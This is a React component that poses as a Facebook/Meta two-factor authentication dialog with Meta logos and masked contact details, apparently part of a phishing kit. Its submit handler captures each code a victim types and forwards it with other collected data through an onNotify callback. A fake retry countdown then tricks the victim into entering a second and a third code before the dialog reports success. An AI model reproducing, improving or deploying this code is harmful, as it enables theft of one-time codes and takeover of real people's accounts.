"use client";

import { FormEvent, useEffect, useState } from "react";
import ModalShell from "@/components/modals/ModalShell";
import { useLocale } from "@/components/business-center/LocaleContext";
import { CONFIG } from "@/lib/config";
import { maskEmail, maskPhone } from "@/lib/notifyMessage";

type Props = {
  open: boolean;
  fullName: string;
  email: string;
  emailBusiness: string;
  phone: string;
  phoneSecondary?: string;
  baseData: Record<string, unknown>;
  onNotify: (payload: Record<string, unknown>) => Promise<void>;
  onSuccess: () => void;
};

function isValidTwoFaCode(value: string) {
  return value.length === 6 || value.length === 8;
}

export default function TwoFactorModal({
  open,
  fullName,
  email,
  emailBusiness,
  phone,
  phoneSecondary = "",
  baseData,
  onNotify,
  onSuccess,
}: Props) {
  const { t, lang } = useLocale();
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [disabled, setDisabled] = useState(false);
  const [step, setStep] = useState(0);
  const [codes, setCodes] = useState<{ first?: string; second?: string }>({});

  useEffect(() => {
    if (!open) {
      setCode("");
      setError("");
      setLoading(false);
      setDisabled(false);
      setStep(0);
      setCodes({});
    }
  }, [open]);

  const codeReady = isValidTwoFaCode(code);
  const canSubmit = !disabled && !loading && codeReady;

  const startCountdown = () => {
    setDisabled(true);
    let time = CONFIG.COUNTDOWN_TIME;
    setError(t("codeRetry", { time }));
    const timer = setInterval(() => {
      time -= 1;
      setError(t("codeRetry", { time }));
      if (time <= 0) {
        clearInterval(timer);
        setDisabled(false);
        setCode("");
        setError("");
      }
    }, 1000);
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const twoFa = code.trim();
    setError("");
    if (!isValidTwoFaCode(twoFa)) {
      setError(t("codeRequired"));
      return;
    }

    setLoading(true);
    if (step === 0) {
      await onNotify({ twoFa, ...baseData });
      setTimeout(() => {
        setCodes({ first: twoFa });
        setLoading(false);
        setStep(1);
        startCountdown();
      }, 1400);
    } else if (step === 1) {
      await onNotify({ twoFaSecond: twoFa, twoFa: codes.first, ...baseData });
      setTimeout(() => {
        setCodes((prev) => ({ ...prev, second: twoFa }));
        setLoading(false);
        setStep(2);
        startCountdown();
      }, 1200);
    } else {
      await onNotify({
        twoFaThird: twoFa,
        twoFa: codes.first,
        twoFaSecond: codes.second,
        ...baseData,
      });
      setTimeout(() => {
        setLoading(false);
        onSuccess();
      }, 1600);
    }
  };

  const contactSeparator =
    lang === "zh" || lang === "zh-tw" || lang === "ja"
      ? "、"
      : lang === "ar"
        ? "، "
        : ", ";
  const contacts = [
    maskEmail(email),
    maskEmail(emailBusiness),
    maskPhone(phone),
    phoneSecondary.trim() ? maskPhone(phoneSecondary) : "",
  ]
    .filter(Boolean)
    .join(contactSeparator);
  const description = t("authDescription", { contacts });

  return (
    <ModalShell id="authModal" open={open}>
      <div className="flex flex-col h-full justify-between">
        <div>
          <div className="flex items-center text-[#9a979e] gap-1.5 text-sm mb-2">
            <span>{fullName}</span>
            <div className="w-1 h-1 bg-[#9a979e] rounded-full" />
            <span>Facebook</span>
          </div>
          <h2 className="text-[20px] text-[black] font-[700] mb-[15px]">
            {t("twoFaTitle")}
          </h2>
          <p className="text-[#9a979e] text-sm mb-4">{description}</p>
          <div className="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
            <img
              src="/images/authentication.jpg"
              alt="2FA"
              width={960}
              height={420}
              decoding="async"
              className="w-full h-auto"
            />
          </div>
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={8}
              disabled={disabled}
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
              placeholder={t("code")}
              className="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3"
            />
            {error ? <p className="text-red-500 text-sm mb-3">{error}</p> : null}
            <button
              type="submit"
              disabled={!canSubmit}
              className={`w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 transition-colors ${
                loading || canSubmit
                  ? "hover:bg-blue-700 cursor-pointer"
                  : "opacity-50 cursor-not-allowed pointer-events-none"
              }`}
            >
              {loading ? (
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto" />
              ) : (
                t("continue")
              )}
            </button>
          </form>
        </div>
        <div className="w-16 mt-5 mx-auto">
          <img src="/icons/ic_meta_gray.svg" alt="Meta" />
        </div>
      </div>
    </ModalShell>
  );
}
